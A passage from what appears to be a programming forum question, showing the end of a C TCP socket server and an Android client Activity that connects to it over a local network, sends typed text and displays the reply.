*/\nnewsockfd = accept(sockfd, (struct sockaddr *)&amp;cli_addr, &amp;clilen);\n\nif (newsockfd &lt; 0) {\n  perror(\"ERROR on accept\");\n  exit(1);\n}\n\n/* If connection is established then start communicating */\nbzero(buffer,256);\nn = read( newsockfd,buffer,255 );\n\nif (n &lt; 0) {\n  perror(\"ERROR reading from socket\");\n  exit(1);\n}\n\nprintf(\"Here is the message: %s\\n\",buffer);\n\n/* Write a response to the client */\n\n//int man = 12345;\nmessage =\"hello\\n\";\n\nn = write(newsockfd, message,strlen(message));\n\n\nreturn 0;\n}\n</code></pre>\n\n<p>****Android Client:****</p>\n\n<pre><code>import android.app.Activity;\nimport android.graphics.Color;\nimport android.net.wifi.WifiInfo;\nimport android.net.wifi.WifiManager;\nimport android.os.Bundle;\nimport android.os.Handler;\nimport android.text.format.Formatter;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.EditText;\nimport android.widget.TextView;\nimport android.widget.Toast;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\n\npublic class ScreenTwo extends Activity {\n    EditText et;\nString txt,ssid,key;\nWifiManager wifiManager;\nprivate Socket socket;\n\nprivate Socket clientSocket;\nprivate BufferedReader input;\n\n\nstatic final int SERVERPORT = 5047;\nprivate static final String SERVER_IP = \"192.168.1.125\";\n\n\n@Override\nprotected void onCreate(Bundle savedInstanceState) {\n    super.onCreate(savedInstanceState);\n    setContentView(R.layout.screen2);\n    new Thread(new ClientThread()).start();\n\n\n}\n\n\n public void onClick(View v) {\n\n    try {\n         EdritText et = (EditText) findViewById(R.id.tb1);\n         Sting str = et.getText().toString();\n         PrintWriter out = new PrintWriter(new BufferedWriter(\n                 new OutputStreamWriter(socket.getOutputStream())),\n                 true);\n         out.println(str + \"\\n\");\n         out.flush();\n\n\n         BufferedReader input = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n         String read = input.readLine();\n         Toast.makeText(this, read, Toast.LENGTH_LONG).show();\n\n        //ready to receive data from server\n         //BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n         //System.out.println(in.readLine());\n         //Toast.makeText(this, in.readLine(), Toast.LENGTH_LONG).show();\n     } catch (UnknownHostException e) {\n         e.printStackTrace();\n     } catch (IOException e) {\n         e.printStackTrace();\n     } catch (Exception e) {\n         e.printStackTrace();\n     }\n }\n\npublic void onEnterBtn(View v)\n{\n    //Toast.makeText(this, \"Clicked on Button\", Toast.LENGTH_LONG).show();\n    et=(EditText)findViewById(R.id.tb1);\n    txt=et.getText().toString();\n    Toast.makeText(this, txt, Toast.LENGTH_LONG).show();\n\n    Button disp = (Button)findViewById(R.id.dispbtn);\n    disp.setBackgroundColor(Color.parseColor(txt));\n\n\n\n} \n\npublic void onbuttonwifi(View v)\n{\n    //Toast.makeText(this, \"Clicked on Button\", Toast.LENGTH_LONG).show();\n    WifiManager wifiMgr = (WifiManager) getSystemService(WIFI_SERVICE);\n    WifiInfo wifiInfo = wifiMgr.getConnectionInfo();\n    int ip = wifiInfo.getIpAddress();\n    String ipAddress = Formatter.formatIpAddress(ip);\n    Toast.makeText(this, ipAddress, Toast.LENGTH_LONG).show();\n\n }\n\nclass ClientThread implements Runnable {\n    @Override\n    public void run() {\n         try {\n             InetAddress serverAddr = InetAddress.getByName(SERVER_IP);\n             socket = new Socket(serverAddr, SERVERPORT);\n\n         } catch (UnknownHostException e1) {\n             e1.printStackTrace();\n         } catch (IOException e1) {\n             e1.printStackTrace();\n         }\n    }\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Thanks in advance :)</p>\n"}]